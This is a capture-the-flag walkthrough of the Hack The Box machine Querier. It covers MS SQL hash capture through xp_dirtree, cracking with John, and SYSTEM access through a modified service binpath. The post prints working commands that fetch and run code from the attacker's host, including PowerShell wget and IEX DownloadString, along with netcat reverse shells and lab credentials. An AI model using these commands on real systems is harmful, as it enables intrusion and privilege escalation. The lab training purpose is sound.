---
header: 
    teaser: /assets/images/HackTheBox/Querier/Querier.png
title: "HTB Walkthrough: Querier"
layout: single
classes: wide
date: 2021-06-20 13:05
categories: [Walkthroughs]
---

This post is related to the Hack The Box machine, Querier, I found this machine taught me a lot in regards to enumerating and attacking MS SQL as well as utilising a tool called binwalk to look at macro enabled files. 

# Enumeration

As with all boxes, first things first kick off an nmap scan to see what's open to us.

## Initial Nmap scan

I like to run a few flags, to get some basic scripts and service version ran against the target, I have a habit of saving the output too which is done by the -oN switch.

    nmap -sC -sV -oN nmapresults 10.10.10.125        
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-18 20:23 BST
    Nmap scan report for 10.10.10.125
    Host is up (0.017s latency).
    Not shown: 996 closed ports
    PORT     STATE SERVICE       VERSION
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp  open  microsoft-ds?
    1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
    | ms-sql-ntlm-info: 
    |   Target_Name: HTB
    |   NetBIOS_Domain_Name: HTB
    |   NetBIOS_Computer_Name: QUERIER
    |   DNS_Domain_Name: HTB.LOCAL
    |   DNS_Computer_Name: QUERIER.HTB.LOCAL
    |   DNS_Tree_Name: HTB.LOCAL
    |_  Product_Version: 10.0.17763
    | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
    | Not valid before: 2021-06-18T19:30:02
    |_Not valid after:  2051-06-18T19:30:02
    |_ssl-date: 2021-06-18T19:31:16+00:00; +7m11s from scanner time.
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: mean: 7m10s, deviation: 0s, median: 7m10s
    | ms-sql-info: 
    |   10.10.10.125:1433: 
    |     Version: 
    |       name: Microsoft SQL Server 2017 RTM
    |       number: 14.00.1000.00
    |       Product: Microsoft SQL Server 2017
    |       Service pack level: RTM
    |       Post-SP patches applied: false
    |_    TCP port: 1433
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2021-06-18T19:31:12
    |_  start_date: N/A

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 15.73 seconds

From this scan my mind immediately wanders to the SMB share that is open on port 139/445.

### Port(s) 139/445

To begin I try to simply list the shares that are available using smbclient.

    smbclient -L \\\\10.10.10.125\\

When prompted for a password I just hit enter, this successfully lists the shares and returns the following:

    Enter WORKGROUP\matt's password:

    Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk      
    SMB1 disabled -- no workgroup available

The shares of ADMIN, C, IPC are all common within SMB and usually require credentials, so I didn't attempt to connect out to these, utilising smbclient again I attempted to connect to the Reports share:

    smbclient \\\\10.10.10.125\\Reports

Again, just pressing enter when prompted for a password:

	Enter WORKGROUP\matt's password: 
	Try "help" to get a list of possible commands.
	smb: \> dir
	  .                                   D        0  Mon Jan 28 23:23:48 2019
	  ..                                  D        0  Mon Jan 28 23:23:48 2019
	  Currency Volume Report.xlsm         A    12229  Sun Jan 27 22:21:34 2019
	
	6469119 blocks of size 4096. 1615177 blocks available

From using DIR it's clear that there isn't much here other than the one file, I grabbed this file and placed it on my Kali machine with mget (I had issues with just grabbing this file using get):

    smb: \> mget *
	Get file Currency Volume Report.xlsm? y
	getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (92.6 KiloBytes/sec) (average 92.6 KiloBytes/sec)

The next step was to take a look at this file, as it was macro enabled I took a copy to my local Windows host, however, this just opened with a blank spreadsheet, even with macros enabled. 

After some googling I discovered a tool built into Kali called 'Binwalk', this tool allows you to view all embedded files and archive files within a file. Running it against the file downloaded from the SMB Share returned the following:

    binwalk Currency\ Volume\ Report.xlsm 
	
	DECIMAL       HEXADECIMAL     DESCRIPTION
	--------------------------------------------------------------------------------
	0             0x0             Zip archive data, at least v2.0 to extract, compressed size: 367, uncompressed size: 1087, name: [Content_Types].xml
	936           0x3A8           Zip archive data, at least v2.0 to extract, compressed size: 244, uncompressed size: 588, name: _rels/.rels
	1741          0x6CD           Zip archive data, at least v2.0 to extract, compressed size: 813, uncompressed size: 1821, name: xl/workbook.xml
	2599          0xA27           Zip archive data, at least v2.0 to extract, compressed size: 260, uncompressed size: 679, name: xl/_rels/workbook.xml.rels
	3179          0xC6B           Zip archive data, at least v2.0 to extract, compressed size: 491, uncompressed size: 1010, name: xl/worksheets/sheet1.xml
	3724          0xE8C           Zip archive data, at least v2.0 to extract, compressed size: 1870, uncompressed size: 8390, name: xl/theme/theme1.xml
	5643          0x160B          Zip archive data, at least v2.0 to extract, compressed size: 676, uncompressed size: 1618, name: xl/styles.xml
	6362          0x18DA          Zip archive data, at least v2.0 to extract, compressed size: 3817, uncompressed size: 10240, name: xl/vbaProject.bin
	10226         0x27F2          Zip archive data, at least v2.0 to extract, compressed size: 323, uncompressed size: 601, name: docProps/core.xml
	10860         0x2A6C          Zip archive data, at least v2.0 to extract, compressed size: 400, uncompressed size: 794, name: docProps/app.xml
    12207         0x2FAF          End of Zip archive, footer length: 22

Just the odd archive here, to be able to do anything meaningful with these files I extracted them using binwalk and the -e switch. This made a new directory called '_Currency Volume Report.xlsmextracted'.

Enumerating this directory returned a few files and folders, it can take some time to enumerate all of these folders and take a look at the files one by one, however, to save time the directory we want to be in is the directory called 'xl'. Changing into this directory and running 'ls' reveals 3 files and 2 more directories, performing a 'cat' on the vbaProject.bin file revealed the following information burried within it. 

![vbaProject](/assets/images/HackTheBox/Querier/vbaproject.png)

## Enumeration Conclusion

With a potential username and password found I could move onto exploitation and gaining a shell. 

# Exploitation

Now, before starting this box I had very little experience or exposure to MS SQL and enumerating/attacking this, I done a quick google and found a couple of useful links, [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server) and [markmotig's](https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478) medium post. The medium post is more in-depth and relevant to the exploit in this situation, however, the hacktricks page is very good and full of resources for enumerating/attacking various services. 

## Connecting to SQL

The nmap scan at the very start of this box successfully identified that it was a Microsoft SQL server instance, therefore, in order to connect to MS SQL I utilised 'mssqlclient.py' which is part of the [impacket](https://github.com/SecureAuthCorp/impacket) toolkit.

    sudo mssqlclient.py QUERIER/reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth

**Note:** You may not need to run with sudo, this will depend if you installed impacket as root or utilising sudo.

This command returned a SQL prompt! Hurahh! However, when I tried to run a command such as 'enable_xp_cmdshell' this told me to go do one as I didn't have the right privs. Bugger.

## Gaining SQL Privileges 

Right then, from this point on I was mostly following the steps outlined in the medium post which is linked above. 

To kick things off in a new tab I hosted an SMB server on my local Kali machine, again utilising the impacket toolkit. Seriously, impacket is awesome. 

    sudo smbserver.py -smb2support share myshare

With this running and waiting I jumped back to my SQL prompt and utilised the 'xp_dirtree' command:

    SQL>EXEC master.sys.xp_dirtree '\\10.10.14.20\\myshare',1, 1

In this command it's important to replace the IP address with your attacking machines IP and replace the 'myshare' with the name of the SMB share you hosted earlier.
Taking a look at my SMB server I have the following response:

    [*] Config file parsed
	[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
	[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
	[*] Config file parsed
	[*] Config file parsed
	[*] Config file parsed
	[*] Incoming connection (10.10.10.125,49680)
	[*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
	[*] User QUERIER\mssql-svc authenticated successfully
	[*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:93225032453b920287e1b4e1d52ff965:010100000000000080fcd8cc3a65d701d35fb5af8bb57bd9000000000100100057004f006600750068004100460045000300100057004f00660075006800410046004500020010007a005a004b004f00480041004a004600040010007a005a004b004f00480041004a0046000700080080fcd8cc3a65d70106000400020000000800300030000000000000000000000000300000ba6e38d03c16f4e9b703b5df9c2d9a47bc96fdad78d2c8f860228f3d5de020900a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003000000000000000000000000000
	[*] Connecting Share(1:IPC$)
	[-] SMB2_TREE_CONNECT not found myshare
	[-] SMB2_TREE_CONNECT not found myshare
	[*] AUTHENTICATE_MESSAGE (\,QUERIER)
	[*] User QUERIER\ authenticated successfully
	[*] :::00::aaaaaaaaaaaaaaaa
	[*] Disconnecting Share(1:IPC$)
	[*] Closing down connection (10.10.10.125,49680)
    [*] Remaining connections []

Well, Hello there. This looks very much like a hash for a service account called 'mssql-svc', a NTLMv2 hash to be specific.
I took this hash, and copied all of it out to a text file called 'hash.txt' and called on JohnTheRipper to crack this:

    john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt ~/Documents/HackTheBox/Querier/hash.txt 
	Using default input encoding: UTF-8
	Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
	Will run 2 OpenMP threads
	Press 'q' or Ctrl-C to abort, almost any other key for status
	corporate568     (mssql-svc)
	1g 0:00:00:06 DONE (2021-06-19 19:49) 0.1562g/s 1399Kp/s 1399Kc/s 1399KC/s correforenz..corococo
	Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
    Session completed

Bingo. Now we have a service account and it's password. Onwards!

## Gaining a shell

Using mssqlclient.py again, this time with the new credentials:

    sudo mssqlclient.py QUERIER/mssql-svc:'corporate568'@10.10.10.125 -windows-auth

Remember I tried to enable the cmdshell and it told me to do one? Yeah... well guess what, attempting to run 'enable_xp_cmdshell' this time round works!

    SQL> enable_xp_cmdshell
	[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
	[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
	SQL> reconfigure

I then wanted to see what could be ran, I ran the 'help' command which indicated that the syntax should be 'xp_cmdshell {command}'. As a test I ran a simple whoami:

    SQL> xp_cmdshell whoami
	output                                                                             
	
	--------------------------------------------------------------------------------   
	
	querier\mssql-svc                                                                  
	
    NULL    

Excellent, now you could be barbaric and use this method to execute commands against this box. However, I wanted a shell as that's much easier to work with. To do this I decided to put a copy of netcat onto the machine and then use that to connect to me. Firstly I ran 'locate nc64.exe' on my Kali machine to see if I had a copy locally and I did, I copied this to my working directory (If you don't have a version of netcat on your machine you can download it [here](https://eternallybored.org/misc/netcat/))

With the file in my working directory I hosted a simple python server:
   
    sudo python3 -m http.server 80

Via the SQL prompt I ran the following command:

    SQL> xp_cmdshell powershell -c wget "http://10.10.14.20/nc64.exe" -Outfile "C:\Reports\nc64.exe"

This simply calls powershell to go out and grab the file off the python server we setup in the step above. You can also use certutil here if you wish. I chose to use the 'Reports' directory as my target location as there was a good chance anyone had write access to this, I could've attempted to make a directory or move into the user directory.

With netcat on the victim box we need to set up a listener on our attacker machine:

    sudo nc -nvlp 9001

Then run the following via the SQL prompt:

    SQL> xp_cmdshell C:\Reports\nc64.exe 10.10.14.20 9001 -e powershell

When I checked the listener, we had a low-level user shell, I chose to execute powershell with my command but if you prefer a generic shell then replace powershell with cmd.exe.

![lowlevelshell](/assets/images/HackTheBox/Querier/lowlevel.png)

# Privilege Escalation

Now, the fun begins! As a habit, I always pull the systeminfo once I have a low-level shell which sometimes returns some goodies and easy wins, however, this was a 2019 server with hotfixes installed so it seemed unlikely that there was going to be a kernel exploit or anyting of the sort here. 

## PowerUp

Before spending time performing manual enumeration I decided to try to run PowerUp.ps1 to see if it returned anything, this is a great script available [here.](https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1)

I copied the raw contents of the script into a new file called PowerUp.ps1 and added a line to the very bottom of the script of 'Invoke-AllChecks', I made sure that the script was in the same directory that my Python server was running from and then executed the following command on the victim machine:

    IEX((New-Object Net.WebClient).DownloadString('http://10.10.14.20:800/PowerUp.ps1'))

This should grab the file and execute it all in one command, the results should look similar to:

    WARNING: [!] PowerUp is written for PowerShell version 2.0
	WARNING: [!] For proper behavior, launch powershell.exe with the '-Version 2' flag
	WARNING: This version of Windows not supported by Invoke-FindPathDLLHijack
	
	[*] Running Invoke-AllChecks
	[*] Checking for unquoted service paths...
	[*] Checking service executable permissions...
	[*] Checking service permissions...
	[*] Use 'Invoke-ServiceUserAdd' to abuse
	[+] Vulnerable service: UsoSvc - C:\Windows\system32\svchost.exe -k netsvcs -p
	[*] Checking for unattended install files...
	[*] Checking %PATH% for potentially hijackable service .dll locations...
	[*] Checking for AlwaysInstallElevated registry key...
    [*] Checking for Autologon credentials in registry...

PowerUp highlights that there may be a vulnerable service that can be exploited, let's take another look at this and perform some manual enumeration on the service to make sure.

## Service Enumeration

To get more information about this service I ran SC QC against it, I had to call the full path of SC since I was in a PowerShell session:

    PS C:\Users\mssql-svc> C:\Windows\system32\sc.exe qc UsoSvc
	C:\Windows\system32\sc.exe qc UsoSvc
	[SC] QueryServiceConfig SUCCESS
	
	SERVICE_NAME: UsoSvc
	        TYPE               : 20  WIN32_SHARE_PROCESS 
	        START_TYPE         : 2   AUTO_START  (DELAYED)
	        ERROR_CONTROL      : 1   NORMAL
	        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p
	        LOAD_ORDER_GROUP   : 
	        TAG                : 0
	        DISPLAY_NAME       : Update Orchestrator Service
	        DEPENDENCIES       : rpcss
    SERVICE_START_NAME : LocalSystem

This confirms that there may be a Binary path that we can control, to make sure that we can start and stop this service I ran the following:

    PS C:\Users\mssql-svc> C:\Windows\system32\sc.exe query UsoSvc
	C:\Windows\system32\sc.exe query UsoSvc
	
	SERVICE_NAME: UsoSvc 
	        TYPE               : 20  WIN32_SHARE_PROCESS  
	        STATE              : 4  RUNNING 
	                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
	        WIN32_EXIT_CODE    : 0  (0x0)
	        SERVICE_EXIT_CODE  : 0  (0x0)
	        CHECKPOINT         : 0x0
	        WAIT_HINT          : 0x0

This returns that the service is STOPPABLE, it looks like we are in business. 

## Exploitation

Time to get malicious with this service, before I got started I wanted to set up a listener ready to catch a shell later down the line:

    sudo nc -nvlp 9002

I already placed nc64.exe onto the machine during an earlier stage, so I can simply use this again. As highlighted by PowerUp as the low level user we are able to edit the Binary Path of this service, we can replace the command it's currently executing with a command to start a shell on our attacker machine, as this service is running as the system there is a chance this will execute our command as an elevated user.

	PS C:\Users\mssql-svc> C:\Windows\system32\sc.exe config UsoSvc binpath="C:\Reports\nc64.exe 10.10.14.20 9002 -e cmd.exe"

This returned a success message, so with the listener running all that was left to do was stop the service:

	PS C:\Users\mssql-svc> C:\Windows\system32\sc.exe stop UsoSvc

Then start it again:

	PS C:\Users\mssql-svc> C:\Windows\system32\sc.exe start UsoSvc

Checking the listener I had a shell as nt authority\system.

![authsystem](/assets/images/HackTheBox/Querier/root.png)

# Summary

As mentioned at the start, this box taught me a thing or two about enumerating and attacking MS SQL, using binwalk to view archives and embedded files in a file and reinforced the idea of exploiting Binary Paths to execute commands of our choice. Thanks for reading and happy hacking!